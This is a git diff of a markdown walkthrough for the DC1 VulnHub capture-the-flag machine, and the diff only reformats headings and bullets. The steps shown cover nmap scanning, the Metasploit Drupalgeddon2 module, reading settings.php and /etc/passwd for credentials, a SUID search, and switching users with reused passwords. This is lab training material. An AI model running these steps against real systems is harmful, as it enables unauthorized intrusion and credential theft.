@@ -55,12 +55,12 @@ The objective is to exploit the DC1 VulnHub machine by identifying and capturing
   ```bash
   ping 10.0.200.6
 
-### Information Gathering
+#### Information Gathering
 - Perform an nmap scan to identify open ports and services:
 `bash
 nmap -A -sC -oN dc.txt 10.0.200.6`
 
-### Enumerate the Web Application
+#### Enumerate the Web Application
 - Access the web application running on port 80 and identify that it is using Drupal.
 - Use Metasploit to find and exploit vulnerabilities in Drupal:
 `bash
@@ -70,7 +70,7 @@ use exploit/unix/webapp/drupal_drupalgeddon2
 set RHOSTS 10.0.200.6
 run`
 
-### Capture Initial Flag
+#### Capture Initial Flag
 - Once you gain a shell, navigate the file system to find the first flag:
 `bash
 Copy code
@@ -92,7 +92,7 @@ cat /var/www/html/sites/default/settings.php`
 - Extract database credentials from the configuration file.
 
 ##### Connect to the Database
-Use the credentials to connect to the MySQL database:
+- Use the credentials to connect to the MySQL database:
 `bash
 mysql -u dbuser -p`
 
@@ -111,17 +111,17 @@ select * from flags;`
 Objective: Identify and capture the third flag by performing privilege escalation.
 
 ##### Identify Weak Configurations
-Search for files with weak permissions or misconfigurations that could allow privilege escalation:
+- Search for files with weak permissions or misconfigurations that could allow privilege escalation:
 `bash
 find / -perm -4000 -type f 2>/dev/null`
 
 ##### Exploit Weakness
-Use tools like GTFOBins to escalate privileges:
+- Use tools like GTFOBins to escalate privileges:
 `bash
 /path/to/vulnerable_binary`
 
 ##### Capture Third Flag
-Once privileges are escalated, navigate the file system to find the third flag:
+- Once privileges are escalated, navigate the file system to find the third flag:
 `bash
 find / -name flag3.txt
 cat /path/to/flag3.txt`
@@ -133,18 +133,18 @@ cat /path/to/flag3.txt`
 Objective: Identify and capture the fourth flag by exploiting user credentials.
 
 ##### Enumerate Users
-List all users on the system and look for interesting files in their home directories:
+- List all users on the system and look for interesting files in their home directories:
 `bash
 cat /etc/passwd
 ls /home`
 
 ##### Check for Reused Passwords
-Try using previously discovered passwords to switch to different users:
+- Try using previously discovered passwords to switch to different users:
 `bash
 su - username`
 
 ##### Capture Fourth Flag
-Navigate the user's home directory to find the fourth flag:
+- Navigate the user's home directory to find the fourth flag:
 `bash
 find /home -name flag4.txt
 cat /path/to/flag4.txt`
@@ -156,16 +156,16 @@ cat /path/to/flag4.txt`
 Objective: Identify and capture the final flag by gaining root access.
 
 ##### Identify Privilege Escalation Vector
-Look for misconfigurations or software vulnerabilities that allow root access.
-Use tools like LinPEAS or manual enumeration to identify vectors.
+- Look for misconfigurations or software vulnerabilities that allow root access.
+- Use tools like LinPEAS or manual enumeration to identify vectors.
 
 ##### Exploit and Gain Root Access
-Perform the privilege escalation to gain root access:
+- Perform the privilege escalation to gain root access:
 `bash
 /path/to/exploit`
 
 ##### Capture Final Flag
-Navigate to the root directory and find the final flag:
+- Navigate to the root directory and find the final flag:
 `bash
 cd /root
 cat final_flag.txt`
@@ -173,7 +173,7 @@ cat final_flag.txt`
 
 <br>
 
-## RAW NOTES TAKEN ALONG THE WAY:
+### RAW NOTES TAKEN ALONG THE WAY:
 
 <img src="https://i.imgur.com/v4y4oYX.png" height="50%" width="50%" alt="DC1 NOTES"/>
 <img src="https://i.imgur.com/ahb61J7.png" height="50%" width="50%" alt="DC1 NOTES"/>
